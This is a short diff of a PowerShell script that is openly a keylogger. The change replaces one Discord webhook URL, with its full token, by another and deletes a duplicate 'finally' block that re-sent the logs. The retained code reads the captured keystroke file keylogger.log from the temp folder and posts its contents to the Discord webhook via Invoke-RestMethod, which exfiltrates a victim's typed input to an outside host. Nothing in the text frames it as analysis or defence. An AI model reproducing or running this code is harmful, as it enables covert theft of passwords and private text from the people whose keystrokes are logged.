@@ -53,24 +53,17 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
       }
     }
   }
-$webhookUri = 'https://discord.com/api/webhooks/938865371790843925/0iTYBgzJrUrvRtC2Jr7etORt93ZtueTNOQ0D0PDxI8iWsa58l0rznZ61VJ50ivrhVGUe'
+  
+
+$webhookUri = 'https://discord.com/api/webhooks/941122393366204447/bqjN-dHZTcO1enFJ51U0XkPTlK_nHMrm7J8PTvxVnbisAlSZSXSFitnrJsqY6eN_tub9'
 $Body = @{
   
   'content' = get-content $env:temp/keylogger.log
 }
 Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
 
-  # send logs if code fails
-  finally {
-    
 
-$webhookUri = 'https://discord.com/api/webhooks/938865371790843925/0iTYBgzJrUrvRtC2Jr7etORt93ZtueTNOQ0D0PDxI8iWsa58l0rznZ61VJ50ivrhVGUe'
-$Body = @{
   
-  'content' = get-content $env:temp/keylogger.log
-}
-Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
-  }
 }
 
 # run keylogger
